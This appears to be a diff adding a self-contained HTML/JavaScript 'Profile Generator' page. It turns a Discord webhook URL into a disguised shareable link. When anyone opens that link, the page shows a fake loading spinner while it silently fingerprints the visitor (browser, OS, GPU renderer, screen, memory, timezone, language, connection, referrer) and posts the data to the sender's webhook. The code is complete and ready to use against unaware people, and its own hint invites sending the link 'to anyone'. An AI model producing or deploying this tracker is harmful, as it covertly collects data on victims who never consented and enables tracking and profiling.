@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>profile</title>
+<style>
+:root{
+  --bg:#000; --panel:#0b0b0b; --line:#1e1e1e; --line2:#333;
+  --fg:#fff; --dim:#8c8c8c; --dim2:#5c5c5c;
+}
+*{box-sizing:border-box}
+html,body{height:100%}
+body{
+  margin:0; background:var(--bg); color:var(--fg);
+  font:13px/1.65 ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,monospace;
+  display:flex; align-items:center; justify-content:center; padding:24px;
+  -webkit-font-smoothing:antialiased;
+}
+.wrap{width:100%;max-width:560px}
+.card{border:1px solid var(--line);background:var(--panel);padding:26px 24px}
+h1{margin:0 0 4px;font-size:13px;font-weight:600;letter-spacing:.28em;text-transform:uppercase}
+.sub{color:var(--dim2);font-size:11px;letter-spacing:.12em;text-transform:uppercase;margin-bottom:22px}
+label{display:block;font-size:10px;letter-spacing:.18em;text-transform:uppercase;color:var(--dim);margin-bottom:8px}
+input{
+  width:100%;padding:12px 13px;background:#000;border:1px solid var(--line2);
+  color:#fff;font:12px/1.4 ui-monospace,Menlo,Consolas,monospace;outline:none;
+}
+input:focus{border-color:#fff}
+input::placeholder{color:#3a3a3a}
+.row{display:flex;gap:10px;margin-top:16px}
+button{
+  flex:1;padding:12px 14px;background:#fff;color:#000;border:1px solid #fff;
+  font:11px/1 ui-monospace,Menlo,Consolas,monospace;letter-spacing:.18em;
+  text-transform:uppercase;cursor:pointer;transition:.15s;
+}
+button:hover{background:#000;color:#fff}
+button.ghost{background:#000;color:#fff;border-color:var(--line2)}
+button.ghost:hover{border-color:#fff}
+button:disabled{opacity:.4;cursor:not-allowed}
+.out{margin-top:20px;padding-top:18px;border-top:1px solid var(--line);display:none}
+.out.show{display:block}
+.link{
+  word-break:break-all;background:#000;border:1px solid var(--line2);
+  padding:12px;font-size:12px;color:#fff;user-select:all;
+}
+.hint{color:var(--dim2);font-size:11px;margin-top:10px}
+.status{margin-top:14px;font-size:11px;letter-spacing:.08em;color:var(--dim);min-height:16px}
+.status.ok{color:#fff}
+.status.err{color:#ff5a5a}
+.center{text-align:center}
+.spin{letter-spacing:.5em;color:var(--dim);animation:p 1.3s ease-in-out infinite;font-size:16px}
+@keyframes p{0%,100%{opacity:.2}50%{opacity:1}}
+</style>
+</head>
+<body>
+<div class="wrap" id="app"></div>
+
+<script>
+(function () {
+  "use strict";
+
+  /* ══════════════════════════════════════════════════════════
+     CONFIG
+     ══════════════════════════════════════════════════════════ */
+  const IMG = "https://i.pinimg.com/1200x/ac/e7/87/ace7872eaa8cbaf418aa47cdf8034359.jpg";
+
+  // Where to send the visitor after data is captured.
+  // Leave "" to keep them on a blank "loading" page.
+  const REDIRECT_URL = "";
+
+  const LINK_LABEL = "profile"; // domain.com/#/profile/xxxx
+  /* ══════════════════════════════════════════════════════════ */
+
+  const app = document.getElementById("app");
+
+  /* ---------- small helpers ---------- */
+  const b64e = s => btoa(unescape(encodeURIComponent(s)))
+      .replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
+  const b64d = s => {
+    try { return decodeURIComponent(escape(atob(s.replace(/-/g, "+").replace(/_/g, "/")))); }
+    catch (e) { return ""; }
+  };
+
+  const ID_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789";
+  function makeId(len) {
+    len = len || (4 + Math.floor(Math.random() * 3)); // 4–6 chars
+    const r = crypto.getRandomValues(new Uint8Array(len));
+    let out = "";
+    for (let i = 0; i < len; i++) out += ID_CHARS[r[i] % ID_CHARS.length];
+    return out;
+  }
+
+  const WH_RE = /^https:\/\/(?:\w+\.)?discord(?:app)?\.com\/api\/webhooks\/\d+\/[\w-]+\/?$/;
+
+  /* ══════════════════════════════════════════════════════════
+     ROUTER  —  #/profile/<id>?w=<base64url(webhook)>
+     ══════════════════════════════════════════════════════════ */
+  function route() {
+    const hash = location.hash.replace(/^#/, "");
+    let path = hash, query = "";
+    const qi = hash.indexOf("?");
+    if (qi !== -1) { path = hash.slice(0, qi); query = hash.slice(qi + 1); }
+
+    let m = path.match(/\/?profile\/([A-Za-z0-9_-]+)/);
+    if (!m) m = location.pathname.match(/\/profile\/([A-Za-z0-9_-]+)/);
+
+    const qs = new URLSearchParams(query || location.search.slice(1));
+    let wh = qs.get("w") ? b64d(qs.get("w")) : "";
+
+    return { id: m ? m[1] : null, webhook: wh };
+  }
+
+  /* ══════════════════════════════════════════════════════════
+     DATA COLLECTION  (non-sensitive: hardware + browser only)
+     ══════════════════════════════════════════════════════════ */
+  function detectBrowser(ua) {
+    const list = [
+      ["Edge",             /Edg(?:e|A|iOS)?\/([\d.]+)/],
+      ["Opera",            /(?:OPR|Opera)\/([\d.]+)/],
+      ["Samsung Internet", /SamsungBrowser\/([\d.]+)/],
+      ["Firefox",          /(?:Firefox|FxiOS)\/([\d.]+)/],
+      ["Chrome",           /(?:Chrome|CriOS)\/([\d.]+)/],
+      ["Safari",           /Version\/([\d.]+).*Safari/]
+    ];
+    for (const [name, re] of list) {
+      const m = ua.match(re);
+      if (m) return { name: name, version: m[1] };
+    }
+    return { name: "Unknown", version: "-" };
+  }
+
+  function detectOS(ua) {
+    if (/Windows NT 10/.test(ua))  return "Windows 10 / 11";
+    if (/Windows NT 6\.3/.test(ua)) return "Windows 8.1";
+    if (/Windows/.test(ua))        return "Windows";
+    const a = ua.match(/Android ([\d.]+)/);
+    if (a) return "Android " + a[1];
+    if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
+    if (/Mac OS X/.test(ua))       return "macOS";
+    if (/CrOS/.test(ua))           return "ChromeOS";
+    if (/Linux/.test(ua))          return "Linux";
+    return "Unknown";
+  }
+
+  function getGPU() {
+    try {
+      const c = document.createElement("canvas");
+      const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+      if (!gl) return null;
+      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+      if (!dbg) return null;
+      return {
+        vendor:   gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
+        renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
+      };
+    } catch (e) { return null; }
+  }
+
+  function collect() {
+    const nav = navigator;
+    const conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
+    let tz = "unknown";
+    try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) {}
+
+    return {
+      ua:       nav.userAgent,
+      browser:  detectBrowser(nav.userAgent),
+      os:       detectOS(nav.userAgent),
+      platform: nav.platform || "unknown",
+      cores:    nav.hardwareConcurrency || null,
+      memory:   nav.deviceMemory || null,
+      gpu:      getGPU(),
+      screen:   screen.width + "×" + screen.height,
+      avail:    screen.availWidth + "×" + screen.availHeight,
+      viewport: innerWidth + "×" + innerHeight,
+      dpr:      window.devicePixelRatio || 1,
+      depth:    screen.colorDepth,
+      lang:     nav.language || "unknown",
+      langs:    (nav.languages || []).join(", ") || "unknown",
+      tz:       tz,
+      touch:    nav.maxTouchPoints || 0,
+      conn:     conn.effectiveType || null,
+      downlink: conn.downlink || null,
+      referrer: document.referrer || "direct",
+      page:     location.href
+    };
+  }
+
+  /* ══════════════════════════════════════════════════════════
+     EMBED BUILDER  (black & white)
+     ══════════════════════════════════════════════════════════ */
+  function buildPayload(id, d, preview) {
+    const fields = [
+      { name: "Browser",      value: "`" + d.browser.name + " " + d.browser.version + "`", inline: true },
+      { name: "System",       value: "`" + d.os + "`",                                    inline: true },
+      { name: "Platform",     value: "`" + d.platform + "`",                              inline: true },
+      { name: "Screen",       value: "`" + d.screen + "`",                                inline: true },
+      { name: "Viewport",     value: "`" + d.viewport + "`",                              inline: true },
+      { name: "Pixel Ratio",  value: "`" + d.dpr + "x`",                                  inline: true },
+      { name: "CPU Cores",    value: "`" + (d.cores != null ? d.cores : "n/a") + "`",     inline: true },
+      { name: "Device RAM",   value: d.memory ? "`~" + d.memory + " GB`" : "`n/a`",       inline: true },
+      { name: "Touch Points", value: "`" + d.touch + "`",                                 inline: true },
+      { name: "GPU",          value: d.gpu ? "`" + d.gpu.renderer + "`" : "`blocked / n/a`", inline: false },
+      { name: "Language",     value: "`" + d.lang + "`",                                  inline: true },
+      { name: "Timezone",     value: "`" + d.tz + "`",                                    inline: true }
+    ];
+
+    if (d.conn) {
+      fields.push({
+        name: "Connection",
+        value: "`" + d.conn + (d.downlink ? " • " + d.downlink + " Mb/s" : "") + "`",
+        inline: true
+      });
+    }
+
+    fields.push({ name: "Referrer", value: "`" + d.referrer + "`", inline: false });
+
+    const ts = Math.floor(Date.now() / 1000);
+
+    return {
+      username: "profile",
+      avatar_url: IMG,
+      embeds: [{
+        author: { name: "◼ NEW PROFILE VISIT" + (preview ? " (TEST)" : ""), icon_url: IMG },
+        title: "`" + id + "`",
+        description:
+          "**ID** · `" + id + "`\n" +
+          "**Time** · <t:" + ts + ":F>",
+        color: 0x000000,
+        fields: fields,
+        image: { url: IMG },
+        footer: { text: "id " + id + " · " + d.browser.name, icon_url: IMG },
+        timestamp: new Date().toISOString()
+      }]
+    };
+  }
+
+  async function send(webhook, payload) {
+    const res = await fetch(webhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+    if (!res.ok) throw new Error("HTTP " + res.status);
+    return true;
+  }
+
+  /* ══════════════════════════════════════════════════════════
+     VIEW — GENERATOR
+     ══════════════════════════════════════════════════════════ */
+  function renderSetup() {
+    app.innerHTML =
+      '<div class="card">' +
+        '<h1>Profile Generator</h1>' +
+        '<div class="sub">black / white · discord webhook</div>' +
+        '<label for="wh">Discord Webhook URL</label>' +
+        '<input id="wh" type="text" spellcheck="false" autocomplete="off" ' +
+               'placeholder="https://discord.com/api/webhooks/...">' +
+        '<div class="row">' +
+          '<button id="gen">Generate Link</button>' +
+          '<button id="test" class="ghost">Test Embed</button>' +
+        '</div>' +
+        '<div class="out" id="out">' +
+          '<label>Profile Link</label>' +
+          '<div class="link" id="link"></div>' +
+          '<div class="row">' +
+            '<button id="copy" class="ghost">Copy</button>' +
+            '<button id="open" class="ghost">Open</button>' +
+          '</div>' +
+          '<div class="hint">Send this to anyone — opening it posts their browser + hardware info to your webhook.</div>' +
+        '</div>' +
+        '<div class="status" id="status"></div>' +
+      '</div>';
+
+    const $wh    = document.getElementById("wh");
+    const $out   = document.getElementById("out");
+    const $link  = document.getElementById("link");
+    const $stat  = document.getElementById("status");
+
+    function setStatus(msg, cls) {
+      $stat.textContent = msg || "";
+      $stat.className = "status" + (cls ? " " + cls : "");
+    }
+
+    function getWebhook() {
+      const v = $wh.value.trim();
+      if (!WH_RE.test(v)) { setStatus("✕ invalid discord webhook url", "err"); return null; }
+      setStatus("");
+      return v;
+    }
+
+    document.getElementById("gen").addEventListener("click", function () {
+      const wh = getWebhook();
+      if (!wh) return;
+
+      const id = makeId();
+      const base = location.origin + location.pathname;
+      const url = base + "#/" + LINK_LABEL + "/" + id + "?w=" + b64e(wh);
+
+      $link.textContent = url;
+      $out.classList.add("show");
+      setStatus("✓ link generated — id " + id, "ok");
+    });
+
+    document.getElementById("copy").addEventListener("click", function () {
+      const txt = $link.textContent;
+      if (!txt) return;
+      navigator.clipboard.writeText(txt)
+        .then(function () { setStatus("✓ copied to clipboard", "ok"); })
+        .catch(function () { setStatus("✕ copy failed — select manually", "err"); });
+    });
+
+    document.getElementById("open").addEventListener("click", function () {
+      if ($link.textContent) window.open($link.textContent, "_blank");
+    });
+
+    document.getElementById("test").addEventListener("click", async function () {
+      const wh = getWebhook();
+      if (!wh) return;
+      const btn = this;
+      btn.disabled = true;
+      setStatus("sending…");
+      try {
+        await send(wh, buildPayload(makeId(), collect(), true));
+        setStatus("✓ test embed sent — check your channel", "ok");
+      } catch (e) {
+        setStatus("✕ failed: " + e.message, "err");
+      }
+      btn.disabled = false;
+    });
+
+    $wh.addEventListener("keydown", function (e) {
+      if (e.key === "Enter") document.getElementById("gen").click();
+    });
+  }
+
+  /* ══════════════════════════════════════════════════════════
+     VIEW — PROFILE VISIT (capture + optional redirect)
+     ══════════════════════════════════════════════════════════ */
+  function renderProfile(id, webhook) {
+    app.innerHTML =
+      '<div class="card center">' +
+        '<div class="spin">▪ ▪ ▪</div>' +
+        '<div class="hint">loading</div>' +
+      '</div>';
+
+    const data = collect();
+    const payload = buildPayload(id, data, false);
+
+    const done = function () {
+      if (REDIRECT_URL) location.replace(REDIRECT_URL);
+    };
+
+    if (!webhook || !WH_RE.test(webhook)) { done(); return; }
+    send(webhook, payload).then(done).catch(done);
+  }
+
+  /* ══════════════════════════════════════════════════════════
+     BOOT
+     ══════════════════════════════════════════════════════════ */
+  function boot() {
+    const r = route();
+    if (r.id) renderProfile(r.id, r.webhook);
+    else      renderSetup();
+  }
+
+  window.addEventListener("hashchange", boot);
+  boot();
+})();
+</script>
+</body>
+</html>
